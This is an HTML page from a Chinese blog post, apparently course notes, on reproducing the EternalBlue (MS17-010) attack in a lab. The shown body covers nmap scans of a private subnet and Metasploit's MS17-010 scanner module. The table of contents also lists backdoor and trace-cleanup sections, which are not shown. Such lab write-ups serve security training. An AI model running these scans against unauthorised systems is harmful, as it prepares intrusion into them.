@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"danggeovo.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="情报搜集阶段查看本机ip ifconfig 查看ip地址   nmap扫描子网 nmap 192.168.21.129&#x2F;24 扫描子网   查看扫描结果，并进行分析威胁建模阶段发现有目标开启了445端口，对其进行进一步扫描，查看操作系统及服务  nmap -O -sV 192.168.21.154    发现该主机开启445端口，并且为win7操作系统，判断可以进行永恒之蓝漏洞利用。 漏洞分析阶段">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝漏洞复现（流程模拟）">
+<meta property="og:url" content="https://danggeovo.github.io/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/index.html">
+<meta property="og:site_name" content="dangge の 小小世界">
+<meta property="og:description" content="情报搜集阶段查看本机ip ifconfig 查看ip地址   nmap扫描子网 nmap 192.168.21.129&#x2F;24 扫描子网   查看扫描结果，并进行分析威胁建模阶段发现有目标开启了445端口，对其进行进一步扫描，查看操作系统及服务  nmap -O -sV 192.168.21.154    发现该主机开启445端口，并且为win7操作系统，判断可以进行永恒之蓝漏洞利用。 漏洞分析阶段">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639285932081.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286382975.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286493773.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286601159.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639288040338.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639287954277.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639306568136.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308549675.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308573542.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308757484.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366204474.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366322903.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639313241515.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367106726.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367188142.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317929928.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317543810.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639318047407.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639368455537.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370391327.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370584443.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370812087.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371086237.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371481362.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309037371.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309117079.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372062857.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372106444.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309269151.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639373652409.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374019249.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320429265.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320736490.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320789421.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639321161778.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374688570.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639375334920.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376468455.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376646107.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376806506.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376885411.png">
+<meta property="article:published_time" content="2023-03-29T05:48:32.000Z">
+<meta property="article:modified_time" content="2023-11-08T10:01:05.578Z">
+<meta property="article:author" content="danggeOvO">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639285932081.png">
+
+
+<link rel="canonical" href="https://danggeovo.github.io/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://danggeovo.github.io/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/","path":"2023/03/29/永恒之蓝漏洞复现（流程模拟）/","title":"永恒之蓝漏洞复现（流程模拟）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>永恒之蓝漏洞复现（流程模拟） | dangge の 小小世界</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">dangge の 小小世界</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">心之所向，无问西东</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86%E9%98%B6%E6%AE%B5"><span class="nav-number">1.</span> <span class="nav-text">情报搜集阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BAip"><span class="nav-number">1.0.1.</span> <span class="nav-text">查看本机ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F%E5%AD%90%E7%BD%91"><span class="nav-number">1.0.2.</span> <span class="nav-text">nmap扫描子网</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="nav-number">1.0.3.</span> <span class="nav-text">查看扫描结果，并进行分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1%E9%98%B6%E6%AE%B5"><span class="nav-number">2.</span> <span class="nav-text">威胁建模阶段</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%98%B6%E6%AE%B5"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5MSF%E6%A1%86%E6%9E%B6"><span class="nav-number">3.0.1.</span> <span class="nav-text">进入MSF框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.2.</span> <span class="nav-text">查找漏洞相关模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.3.</span> <span class="nav-text">利用扫描模块</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%98%B6%E6%AE%B5"><span class="nav-number">4.</span> <span class="nav-text">漏洞攻击阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%82%E6%95%B0"><span class="nav-number">4.0.1.</span> <span class="nav-text">查看参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E5%AE%9A%E5%8F%82%E6%95%B0"><span class="nav-number">4.0.2.</span> <span class="nav-text">设定参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AEpayload"><span class="nav-number">4.0.3.</span> <span class="nav-text">设置payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#run-%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90"><span class="nav-number">4.0.4.</span> <span class="nav-text">run-&gt;获得权限</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E9%98%B6%E6%AE%B5"><span class="nav-number">5.</span> <span class="nav-text">后渗透攻击阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">5.1.</span> <span class="nav-text">meterpreter的基本系统命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">5.2.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getsystem%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.1.</span> <span class="nav-text">getsystem提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypassuac"><span class="nav-number">5.2.2.</span> <span class="nav-text">bypassuac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E9%AB%98%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB"><span class="nav-number">5.2.3.</span> <span class="nav-text">提高程序运行级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.4.</span> <span class="nav-text">利用windows提权漏洞进行提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5"><span class="nav-number">5.2.5.</span> <span class="nav-text">令牌操纵</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="nav-number">5.3.</span> <span class="nav-text">后续提权操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">5.3.1.</span> <span class="nav-text">基本信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash%E4%B8%8E%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="nav-number">5.3.2.</span> <span class="nav-text">hash与明文密码读取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">5.4.</span> <span class="nav-text">文件系统命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">5.5.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5"><span class="nav-number">5.6.</span> <span class="nav-text">后门植入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%A4%8D%E5%85%A5"><span class="nav-number">5.6.1.</span> <span class="nav-text">启动项植入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metsvc%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-number">5.6.2.</span> <span class="nav-text">metsvc服务后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">5.7.</span> <span class="nav-text">痕迹清理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E5%91%8A%E9%98%B6%E6%AE%B5"><span class="nav-number">6.</span> <span class="nav-text">报告阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E9%98%B2"><span class="nav-number">6.1.</span> <span class="nav-text">预防</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD445%E7%AB%AF%E5%8F%A3"><span class="nav-number">6.1.0.1.</span> <span class="nav-text">关闭445端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD135%E7%AB%AF%E5%8F%A3"><span class="nav-number">6.1.0.2.</span> <span class="nav-text">关闭135端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD137%E3%80%81138%E3%80%81139%E7%AB%AF%E5%8F%A3"><span class="nav-number">6.1.0.3.</span> <span class="nav-text">关闭137、138、139端口</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.2.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="danggeOvO"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">danggeOvO</p>
+  <div class="site-description" itemprop="description">记录生活与学习!</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/danggeOvO" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;danggeOvO" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:95239002@qq.com" title="E-Mail → mailto:95239002@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="danggeOvO">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dangge の 小小世界">
+      <meta itemprop="description" content="记录生活与学习!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="永恒之蓝漏洞复现（流程模拟） | dangge の 小小世界">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          永恒之蓝漏洞复现（流程模拟）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-29 13:48:32" itemprop="dateCreated datePublished" datetime="2023-03-29T13:48:32+08:00">2023-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-08 18:01:05" itemprop="dateModified" datetime="2023-11-08T18:01:05+08:00">2023-11-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">【-专业知识-】渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AF%BE%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">课程记录</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h1><h3 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h3><blockquote>
+<p><code>ifconfig</code> 查看ip地址</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639285932081.png" alt="查看ip"></p>
+<h3 id="nmap扫描子网"><a href="#nmap扫描子网" class="headerlink" title="nmap扫描子网"></a>nmap扫描子网</h3><blockquote>
+<p><code>nmap 192.168.21.129/24 扫描子网</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286382975.png" alt="子网扫描"></p>
+<h3 id="查看扫描结果，并进行分析"><a href="#查看扫描结果，并进行分析" class="headerlink" title="查看扫描结果，并进行分析"></a>查看扫描结果，并进行分析</h3><h1 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h1><p>发现有目标开启了445端口，对其进行进一步扫描，查看操作系统及服务</p>
+<blockquote>
+<p><code>nmap -O -sV 192.168.21.154 </code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286493773.png" alt="查看操作系统"></p>
+<p>发现该主机开启445端口，并且为win7操作系统，判断可以进行永恒之蓝漏洞利用。</p>
+<h1 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h1><h3 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h3><blockquote>
+<p>msfconsole</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286601159.png" alt="进入msf框架"></p>
+<h3 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h3><blockquote>
+<p><code>search ms17-010</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639288040338.png" alt="模块查找"></p>
+<h3 id="利用扫描模块"><a href="#利用扫描模块" class="headerlink" title="利用扫描模块"></a>利用扫描模块</h3><blockquote>
+<p><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhost 192.168.21.154</code><br><code>run</code></p>
+</blockquote>
